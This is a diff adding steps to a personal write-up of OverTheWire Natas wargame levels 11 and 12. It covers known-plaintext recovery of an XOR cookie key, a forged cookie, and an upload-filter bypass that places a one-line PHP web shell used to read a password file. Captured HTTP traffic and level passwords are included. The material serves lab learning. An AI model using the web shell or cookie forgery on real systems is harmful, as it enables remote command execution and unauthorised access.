@@ -988,11 +988,213 @@ Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
 </html>
 ```
 
-### Approach 
 
 ### Finding 
+By analyzing the source code, it was identified that the default data structure:
+```php
+$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+```
+is used to generate a cookie through the following function:
+```php
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+```
+To understand how the json_encode() output appears, a simple PHP test was conducted through php sandbox (https://onlinephp.io/):
+```php
+<?php
+$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+$tempdata = json_encode($defaultdata);
+echo $tempdata;
+?>
+```
+This produces the following JSON string:
+```php
+{"showpassword":"no","bgcolor":"#ffffff"}
+```
+This value serves as the plaintext in the encryption process.
+
+Next, the plaintext is encrypted using the xor_encrypt() function with an unknown key. The result is then encoded using Base64 to produce the cookie value:
+```
+HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
+```
+This value can be treated as the **ciphertext**.
+
+To solve the challenge, it is necessary to recover the XOR key. The process can be summarized as follows:
+1. json_encode($d) → plaintext
+2. plaintext ⊕ key → intermediate value
+3. Base64 encode → cookie (ciphertext)
+
+Thus:
+```
+plaintext ⊕ key = Base64 decode(cookie)
+```
+Using XOR properties:
+- plaintext ⊕ key = ciphertext
+- plaintext ⊕ ciphertext = key
+- ciphertext ⊕ plaintext = key
+
+In this case, the most reliable approach is:
+```
+key = ciphertext ⊕ plaintext
+```
+This method is preferred because the plaintext is fully known and does not contain ambiguity.
+
+Additionally, directly using the decoded cookie as a key is not practical because it may:
+- contain non-printable characters
+- be difficult to handle or copy accurately
+- introduce encoding inconsistencies (e.g., UTF-8 vs raw bytes)
+
+Therefore, deriving the key using known plaintext provides a more stable and accurate result.
+
+
+### Approach 
+The request and response were intercepted using Burp Suite for further analysis.
+The request content is: 
+```
+GET / HTTP/1.1
+Host: natas11.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
+Upgrade-Insecure-Requests: 1
+```
+
+The response content is: 
+```
+HTTP/1.1 200 OK
+Date: Mon, 13 Apr 2026 11:33:24 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
+Vary: Accept-Encoding
+Content-Length: 1085
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>
+
+<h1>natas11</h1>
+<div id="content">
+<body style="background: #ffffff;">
+Cookies are protected with XOR encryption<br/><br/>
+
+
+<form>
+Background color: <input name=bgcolor value="#ffffff">
+<input type=submit value="Set color">
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+The captured request contained the following cookie:
+```http
+Cookie: ...; data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
+```
+The server response also confirmed that the same cookie value was being used. This indicates that the data cookie stores the encrypted user data.
+
+#### Key Recovery Using CyberChef
+To recover the XOR key, CyberChef was used with the following steps:
+1. Input the cookie value: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=`
+2. Apply Base64 Decode to obtain the raw XOR-encrypted data
+3. Perform XOR using the known plaintext: `{"showpassword":"no","bgcolor":"#ffffff"}`
+4. The resulting output revealed a repeating key stream: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`
+5. From this pattern, the XOR key was identified as: `eDWo`
+
+#### Cookie Manipulation
+1. After recovering the key, a modified plaintext was constructed: `{"showpassword":"yes","bgcolor":"#ffffff"}`
+2. The modified data was then XOR-encrypted using the key `eDWo`
+3. Base64 encoded
+4. URL encoded
+5. Resulting in the following cookie value: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`
+
+#### Exploitation
+The original request was sent to Repeater in Burp Suite, and the data cookie was replaced with the modified value.
+
+Below are the response obtained after modified request is sent:
+```
+GET / HTTP/1.1
+Host: natas11.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
+Upgrade-Insecure-Requests: 1
+```
+
+after sending the request, the following response is obtained: 
+```
+HTTP/1.1 200 OK
+Date: Mon, 13 Apr 2026 13:04:15 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
+Vary: Accept-Encoding
+Content-Length: 1149
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>
+
+<h1>natas11</h1>
+<div id="content">
+<body style="background: #ffffff;">
+Cookies are protected with XOR encryption<br/><br/>
+
+The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
+<form>
+Background color: <input name=bgcolor value="#ffffff">
+<input type=submit value="Set color">
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+After resending the request, the server returned:
+```
+The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+```
+This confirms that modifying the encrypted cookie successfully altered the application’s behavior and revealed the password.
+
 
 ### Analysis
+This level demonstrates a **weak encryption implementation using XOR with a repeating key**. Since XOR is reversible, and part of the plaintext is known (default JSON structure), it is possible to recover the encryption key using: `key = ciphertext XOR plaintext`.
+
+Once the key is obtained, attackers can forge arbitrary cookie values and manipulate application behavior. In this case, modifying `"showpassword"` to `"yes"` allowed the application to reveal the password for the next level. This highlights that XOR with a repeating key is not secure for protecting sensitive data. Proper cryptographic mechanisms with secure key management should be used instead.
+
 
 ---
 
@@ -1001,15 +1203,264 @@ Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
 ```
 URL: http://natas12.natas.labs.overthewire.org
 Username: natas12
-Password: 
+Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 ```
-After login, the following note is displayed: 
+After login, the webpage displayed a message `Choose a JPEG to upload (max 1KB):` and along with `Browse...` and `Upload File` buttons. 
 
-### Approach 
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+<?php
+
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+<form enctype="multipart/form-data" action="index.php" method="POST">
+<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+Choose a JPEG to upload (max 1KB):<br/>
+<input name="uploadedfile" type="file" /><br />
+<input type="submit" value="Upload File" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+By inspecting the source code, it can be observed that the application determines the uploaded file’s extension based on the filename parameter in the POST request, rather than validating the actual file content. This indicates a potential file upload vulnerability.
+
 
 ### Finding 
+POST /index.php HTTP/1.1
+Host: natas12.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------351904127543584259351122112
+Content-Length: 1301
+Origin: http://natas12.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
+Connection: keep-alive
+Referer: http://natas12.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="filename"
+
+4dmcppkv9n.jpg
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
+Content-Type: image/jpeg
+
+ÿØÿà
+
+
+(content of the image file) **At here, some of the conetent is deleted so that the size of the file can less than maximum file size (1000 Bytes)**
+
+
+Response: 
+```
+HTTP/1.1 200 OK
+Date: Mon, 13 Apr 2026 13:50:59 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 976
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+The file <a href="upload/icudqaa924.jpg">upload/icudqaa924.jpg</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+The webpage provides a file upload functionality that accepts a JPEG file (maximum 1KB). Initial testing confirms that uploaded files are stored in the /upload/ directory and can be accessed via a generated link. After the file is successfully uploaded, the webpage will display a message "The file upload/icudqaa924.jpg has been uploaded". Then, if the link upload/icudqaa924.jpg is clicked, it will navigate to `http://natas12.natas.labs.overthewire.org/upload/icudqaa924.jpg` to view the picture we uploaded. 
+
+
+### Approach 
+#### Request content
+```
+POST /index.php HTTP/1.1
+Host: natas12.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------351904127543584259351122112
+Content-Length: 1301
+Origin: http://natas12.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
+Connection: keep-alive
+Referer: http://natas12.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="filename"
+
+4dmcppkv9n.php
+-----------------------------351904127543584259351122112
+Content-Disposition: form-data; name="uploadedfile"; filename="picture1.jpeg"
+Content-Type: application/x-php
+
+<?php passthru($_GET['bandit12']); ?>
+
+-----------------------------351904127543584259351122112--
+```
+
+#### Response content: 
+```
+HTTP/1.1 200 OK
+Date: Mon, 13 Apr 2026 14:06:59 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 976
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+The file <a href="upload/vodo7kpu39.php">upload/vodo7kpu39.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Intercepting the request using Burp Suite reveals that the filename parameter can be modified. Instead of keeping the default .jpg extension, it is changed to .php, allowing a PHP script to be uploaded.
+
+A malicious payload is then injected into the file content:
+```
+<?php passthru($_GET['bandit12']); ?>
+```
+This payload enables remote command execution via a URL parameter.
+
+After modifying the request:
+- Change filename to a .php extension
+- Replace the file content with the PHP payload
+- Send the request
+
+The server successfully uploads the file and returns a messsage "The file upload/vodo7kpu39.php has been uploaded" is displayed. Next, if clicking the link `upload/vodo7kpu39.php` will navigate to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php` and get the following message: 
+```
+Notice: Undefined index: bandit12 in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
+Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/vodo7kpu39.php on line 1
+```
+Accessing this file directly results in an error because no command is provided. However, by appending a query parameter `?bandit12=ls`, commands can be executed. 
+
+For example, 
+change the link to `http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?bandit12=ls`
+and many files are displayed. 
+```
+01bigp04x7.jpg 01fsa2644e.jpg 01kjg7ulvc.php 022sjfkuwh.php 03ch7myxsp.jpg 04assx4poq.jpg 05xsaulnkl.jpg 06nwepxdiz.php 06zm2zlp06.jpg 078o93t3j2.jpg 07a5kdl5z9.jpg 08rwwwg6s1.php 092suz141s.php 09rfuwcp4j.jpg 0ams7zb4s1.jpg 0b87iktaek.jpg 0dma0zht0x.jpg 0g61wmmk1b.php 0gn1xn0fbt.php 0i4zzz9jzt.jpg 0k1u3i93kk.jpgaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 0mr5hvltj1.jpg 0n9bbv6c0s.jpg 0o3dgvqc07.jpg 0oklxf29sd.php 0pvupmvufi.jpg 0r11bpi050.php 0rv2aw0wx4.php 0rve6oxo6g.jpg 0slsuamtzz.php 0t28zwuwf5.jpg 0v47rcr60b.jpg 0wkd0y4mtj.jpg 0x2g8juukh.jpg 0xgvkqahot.php 0y664sk9s1.php 0zvecabpxi.txt%7f 11csvhcimo.jpg 127wtu6wcx.jpg 12qub97lsg.jpg 14jmyp172u.php 15nyx7zwv7.jpg 15xc1kfy8u.jpg 17d37hyq3h.jpg 18haov338q.jpg 19jzfg9xlv.jpg 19wxioc80x.app 1bf11s9nk6.jpgfgh 1bu6gzxiaw.php
+```
+This confirms that the uploaded file is being executed as a PHP script.
+
+Finally, retrieving the password is achieved by executing: `?bandit12=cat /etc/natas_webpass/natas13`, which returns the credential for the next level.
+
+For example: 
+`http://natas12.natas.labs.overthewire.org/upload/vodo7kpu39.php?bandit12=cat%20/etc/natas_webpass/natas13` will get the output trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
 
 ### Analysis
+This level demonstrates an insecure file upload vulnerability, where the application fails to properly validate uploaded files. Although the interface suggests only JPEG files are allowed, the server relies on user-controlled input (filename) to determine the file extension.
+
+As a result, attackers can bypass restrictions by uploading a malicious script disguised as an image, leading to remote code execution (RCE).
+
+Additionally, the absence of proper validation mechanisms such as:
+- MIME type checking
+- File content verification
+- Restricting executable extensions
+
+makes the application highly vulnerable.
+
+This highlights the importance of implementing strict server-side validation for file uploads. Relying solely on client-side controls or user-supplied metadata can easily be bypassed, allowing attackers to execute arbitrary commands on the server.
+
 
 ---
 
@@ -1018,7 +1469,7 @@ After login, the following note is displayed:
 ```
 URL: http://natas13.natas.labs.overthewire.org
 Username: natas13
-Password: 
+Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
 ```
 After login, the following note is displayed: 
 
